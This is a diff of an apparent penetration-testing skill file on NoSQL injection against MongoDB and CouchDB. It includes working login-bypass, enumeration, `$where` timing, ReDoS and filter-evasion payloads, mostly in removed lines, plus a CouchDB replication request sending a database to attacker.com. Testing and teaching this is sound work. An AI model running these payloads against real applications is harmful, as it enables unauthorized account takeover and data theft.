@@ -1,4 +1,4 @@
----
+﻿---
 name: nosql-injection
 description: "NoSQL injection exploitation for MongoDB, CouchDB, and other document databases including operator injection"
 category: specialized
@@ -50,23 +50,9 @@ MongoDB queries accept operator objects. When application code constructs a quer
 
 **Vulnerable pattern (Node.js/Express):**
 
-```javascript
-// VULNERABLE — req.body is passed directly to find()
-app.post('/login', async (req, res) => {
-  const user = await db.collection('users').findOne(req.body);
-  if (user) return res.json({ success: true, user });
-  res.status(401).json({ success: false });
-});
-```
 
 **Attack payload:**
 
-```json
-POST /login
-Content-Type: application/json
-
-{"username": {"$ne": ""}, "password": {"$ne": ""}}
-```
 
 **Result:** Query becomes `db.users.findOne({username: {$ne: ""}, password: {$ne: ""}})` — matches any user with non-empty credentials.
 
@@ -91,31 +77,19 @@ Content-Type: application/json
 
 **Extract all usernames:**
 
-```json
-{"username": {"$ne": ""}, "password": {"$ne": ""}}
-```
 
 **Enumerate specific field values using regex:**
 
-```json
-{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
-```
 
 Increment the first character (`a`, `b`, `c`, ...) to enumerate usernames character by character.
 
 **Extract password length:**
 
-```json
-{"username": "admin", "password": {"$regex": "^.{8}$"}}
-```
 
 Adjust the length pattern until a match is found.
 
 **Extract ObjectId (known format — 24 hex chars):**
 
-```json
-{"_id": {"$regex": "^[0-9a-f]{24}$"}}
-```
 
 ---
 
@@ -125,27 +99,15 @@ When URL parameters are parsed as JSON, inject operators directly in query strin
 
 **Vulnerable endpoint:**
 
-```
-GET /api/users?filter={"name":"admin"}
-```
 
 **Attack:**
 
-```
-GET /api/users?filter={"name":{"$ne":""}}
-```
 
 **For login bypass via GET:**
 
-```
-GET /api/login?username=admin&password[0][$ne]=&password[1][$ne]=
-```
 
 **Another variant — nested object injection:**
 
-```
-GET /api/user?query={"$where":"this.role==='admin'"}
-```
 
 The server-side `JSON.parse()` on the query string converts the parameter to a proper MongoDB operator object before passing it to the database driver.
 
@@ -157,32 +119,17 @@ When frameworks (e.g., Express with `qs` library) parse query strings, bracket n
 
 **Basic array injection:**
 
-```
-POST /login
-Content-Type: application/x-www-form-urlencoded
-
-username=admin&password[$ne]=&password[$type]=string
-```
 
 **Express `qs` parsing produces:**
 
-```json
-{"username": "admin", "password": {"$ne": "", "$type": "string"}}
-```
 
 **Double-nested:**
 
-```
-username[$ne]=&password[$ne]=
-```
 
 Produces: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
 
 **Type restriction bypass:**
 
-```
-username=admin&password[$ne]=&password[$type]=string
-```
 
 This ensures the `$ne` operator only matches string-type fields, avoiding ObjectId or array matches that could cause errors.
 
@@ -192,63 +139,18 @@ This ensures the `$ne` operator only matches string-type fields, avoiding Object
 
 ### Direct Bypass
 
-```json
-POST /api/auth/login
-Content-Type: application/json
-
-{
-  "username": {"$ne": ""},
-  "password": {"$ne": ""}
-}
-```
 
 ### Username Enumeration + Targeted Bypass
 
-```json
-POST /api/auth/login
-Content-Type: application/json
-
-{
-  "username": {"$regex": "^admin"},
-  "password": {"$ne": ""}
-}
-```
 
 ### Passwordless Bypass (username known)
 
-```json
-POST /api/auth/login
-Content-Type: application/json
-
-{
-  "username": "admin",
-  "password": {"$ne": ""}
-}
-```
 
 ### Bypass with `$in` (target multiple accounts)
 
-```json
-POST /api/auth/login
-Content-Type: application/json
-
-{
-  "username": {"$in": ["admin", "administrator", "root", "superadmin"]},
-  "password": {"$ne": ""}
-}
-```
 
 ### Bypass via `$exists`
 
-```json
-POST /api/auth/login
-Content-Type: application/json
-
-{
-  "username": {"$exists": true},
-  "password": {"$exists": true}
-}
-```
 
 Matches any document where both fields exist — effectively all valid users.
 
@@ -260,41 +162,23 @@ MongoDB supports `$where` clauses that execute JavaScript. This is the NoSQL equ
 
 ### Basic `$where` Injection
 
-```json
-{"$where": "this.password.length > 0"}
-```
 
 ### Boolean-Based Extraction
 
-```json
-{"$where": "this.password.charAt(0) === 'a'"}
-```
 
 Iterate over characters to extract password values.
 
 ### Conditional Sleep (Blind Extraction)
 
-```json
-{"$where": "if(this.password.charAt(0)==='a'){sleep(5000); return true; } return false;"}
-```
 
 > **Note:** `sleep()` is not available in all MongoDB versions. Use `db.getReplicationInfo()` or serverStatus-based timing as an alternative.
 
 ### Data Exfiltration via `$where`
 
-```json
-{"$where": "this.role === 'admin'"}
-```
 
-```json
-{"$where": "Object.keys(this).forEach(function(k){if(k==='password'){/* field exists */}})"}
-```
 
 ### `$where` with `$regex` (Combined)
 
-```json
-{"$where": "this.username.match(/^admin/) !== null"}
-```
 
 ### ⚠️ `$where` Performance Warning
 
@@ -308,25 +192,13 @@ MongoDB `$regex` is vulnerable to catastrophic backtracking with crafted pattern
 
 ### Basic ReDoS Pattern
 
-```json
-{"username": {"$regex": "^(a+)+$"}}
-```
 
 This pattern causes exponential backtracking in most regex engines. The MongoDB server processes this against every document, amplifying the CPU cost.
 
 ### Variants
 
-```json
-{"email": {"$regex": "^(a|a)+$"}}
-```
 
-```json
-{"name": {"$regex": "^(a|a?)+$"}}
-```
 
-```json
-{"search": {"$regex": "(a|aa)+"}}
-```
 
 ### Detection
 
@@ -350,9 +222,6 @@ CouchDB exposes a REST API with query capabilities. Injection vectors differ fro
 
 ### `_all_docs` Enumeration
 
-```
-GET /{database}/_all_docs?include_docs=true&limit=100
-```
 
 If the application does not restrict this endpoint, all documents are enumerable.
 
@@ -360,17 +229,6 @@ If the application does not restrict this endpoint, all documents are enumerable
 
 CouchDB `_find` accepts Mango query JSON. If user input reaches the query body:
 
-```json
-POST /{database}/_find
-Content-Type: application/json
-
-{
-  "selector": {
-    "username": {"$ne": ""},
-    "password": {"$ne": ""}
-  }
-}
-```
 
 ### Mango Query Operators
 
@@ -387,36 +245,16 @@ Content-Type: application/json
 
 ### CouchDB Authentication Bypass
 
-```
-POST /{database}/_find
-Content-Type: application/json
-
-{
-  "selector": {
-    "type": "user",
-    "name": {"$ne": ""},
-    "password": {"$ne": ""}
-  },
-  "limit": 1
-}
-```
 
 ### CouchDB `_utils` Access
 
 Check for Futon/FTUX admin interface:
 
-```
-GET /_utils/
-GET /_utils/index.html
-```
 
 If accessible, provides direct database access without injection.
 
 ### CouchDB `_changes` Feed
 
-```
-GET /{database}/_changes?include_docs=true&limit=100
-```
 
 Reveals document changes — useful for extracting recent data without knowing document IDs.
 
@@ -424,16 +262,6 @@ Reveals document changes — useful for extracting recent data without knowing d
 
 If admin access is achieved:
 
-```json
-POST /_replicate
-Content-Type: application/json
-
-{
-  "source": "target_db",
-  "target": "http://attacker.com/leaked_db",
-  "create_target": true
-}
-```
 
 ---
 
@@ -443,9 +271,6 @@ When responses do not reflect injected data, use timing to infer results.
 
 ### MongoDB `$where` Sleep
 
-```json
-{"$where": "if(this.username==='admin'){var start=new Date();while((new Date()-start)<5000){}} return true;"}
-```
 
 > **Note:** `sleep()` is not standard in all MongoDB deployments. CPU-bound loops work but may trigger watchdog termination.
 
@@ -453,21 +278,11 @@ When responses do not reflect injected data, use timing to infer results.
 
 Complex regex patterns cause measurable delays:
 
-```
-{"username": {"$regex": "^admin.*"}}
-```
 
 Response time increases with pattern complexity and collection size.
 
 ### CouchDB Mango Timing
 
-```json
-{
-  "selector": {
-    "$where": "function(){ var start = Date.now(); while(Date.now()-start < 5000){} return true; }"
-  }
-}
-```
 
 > **Note:** CouchDB `_find` does not support `$where`. Use field existence checks with timing via network-level delays.
 
@@ -487,59 +302,26 @@ Response time increases with pattern complexity and collection size.
 
 Try `application/x-www-form-urlencoded` with bracket notation instead of JSON:
 
-```
-username[$ne]=&password[$ne]=
-```
 
 Or `multipart/form-data`:
 
-```
-------WebKitFormBoundary
-Content-Disposition: form-data; name="username[$ne]"
-
-------WebKitFormBoundary
-Content-Disposition: form-data; name="password[$ne]"
-
-------WebKitFormBoundary--
-```
 
 ### Encoding Bypass
 
 URL-encode operators:
 
-```
-%7B%22username%22%3A%7B%22%24ne%22%3A%22%22%7D%7D
-```
 
 Double-encode for bypass:
 
-```
-%257B%2522username%2522%253A%257B%2522%2524ne%2522%253A%2522%2522%257D%257D
-```
 
 ### Unicode Encoding
 
-```json
-{"username": {"\u0024ne": ""}}
-```
 
-```json
-{"username": {"＄ne": ""}}
-```
 
 ### Alternate Representations
 
-```json
-{"username": {"$not": {"$eq": ""}}}
-```
 
-```json
-{"username": {"$nin": [""]}}
-```
 
-```json
-{"username": {"$or": [{"$gt": ""}, {"$lt": ""}]}}
-```
 
 ---
 
@@ -589,3 +371,24 @@ Double-encode for bypass:
 - [ ] Confirm data extraction matches actual response content
 - [ ] Confirm timing is consistent across multiple requests (>3 repeats)
 - [ ] Confirm no `mongo-sanitize` or equivalent is stripping operators
+
+## Trigger Conditions
+
+Activate when requests carry JSON bodies or parameters that reach a document database (MongoDB, CouchDB, Couchbase, Elasticsearch). Signs: JSON request bodies on login/registration/search endpoints, query-string JSON (`?filter={"$ne":""}`), errors mentioning `BSON`/`ObjectId`/`MongoError`, `_id` fields in responses, or `X-Powered-By: Express`. Also trigger on authentication forms backed by document stores, where operator substitution can bypass login. Do not trigger on relational databases (use SQLi skill) or when input is strictly typed to strings/numbers by the server.
+
+## Detection Approach
+
+Confirm JSON parsing first: send a malformed-but-valid JSON object and observe a type/parse response vs a generic error. Then probe operator injection: replace a string field value with an operator object such as `{"$ne":""}` and compare the response (record count, status, body) against a benign true/false pair. A difference proves query-logic manipulation. For authentication endpoints, attempt the classic `{"username":{"$ne":""},"password":{"$ne":""}}` bypass and observe whether a session or different user is returned. If responses are non-reflective, pivot to blind: timing via `$where`/`$regex` complexity, or boolean-differential responses. For CouchDB, probe `_all_docs`, `_find` (Mango), and `_changes`. When operators are stripped, try Content-Type switching (form-urlencoded bracket notation, multipart), encoding, or alternate representations. Prefer operators over `$where` (slow, sandbox-bound) unless blind extraction is required.
+
+## Pitfalls
+
+- Assuming `$where` yields OS RCE — it runs in MongoDB's JS sandbox, not the host OS; never claim system command execution.
+- Treating response-length differences as data when no values are shown — pair differential with actual extracted content.
+- Assuming `sleep()` is available in `$where`; verify or use CPU-bound timing before reporting time-based blind.
+- Overlooking framework sanitizers (`express-mongo-sanitize`, Mongoose schema validation) that strip operators by default — test, don't assume.
+- Confusing NoSQL with SQLi semantics — there is no `UNION`/`DROP`; manipulation is via operators.
+- Single-request timing is noisy — repeat blind timing >3 times and compare true vs false conditions.
+
+## Verification & Impact
+
+CONFIRMED when the response materially differs for true vs false operator conditions with actual data shown (e.g., extra records, a logged-in session for an unknown password), or when blind timing is consistently and repeatably longer for true conditions. SUSPECTED when only a status/length shift is seen with no data or no repeated timing confirmation — record as candidate. Document impact by capability: authentication bypass (highest — account takeover), data extraction/enumeration (usernames, records), information disclosure, or ReDoS DoS with measured latency. Capture the exact operator payloads and request/response pairs via `recordEvidence`.
